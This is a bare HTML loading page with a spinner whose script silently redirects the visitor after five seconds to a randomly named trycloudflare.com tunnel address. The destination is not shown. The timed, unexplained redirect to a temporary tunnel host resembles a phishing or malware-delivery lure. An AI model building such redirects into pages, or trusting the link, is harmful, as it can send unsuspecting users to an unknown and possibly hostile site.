<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Loading...</title>
  <style>
    body, html {
      height: 100%;
      margin: 0;
      display: flex;
      justify-content: center;
      align-items: center;
      background: #f7f9fc;
      font-family: Arial, sans-serif;
    }
    .spinner {
      border: 12px solid #e0e0e0;
      border-top: 12px solid #1a73e8;
      border-radius: 50%;
      width: 80px;
      height: 80px;
      animation: spin 1.2s linear infinite;
    }
    @keyframes spin {
      0% { transform: rotate(0deg);}
      100% { transform: rotate(360deg);}
    }
  </style>
  <script>
    setTimeout(() => {
      window.location.href = "https://tracking-roughly-travelers-anti.trycloudflare.com";
    }, 5000);
  </script>
</head>
<body>
  <div class="spinner"></div>
</body>
</html>
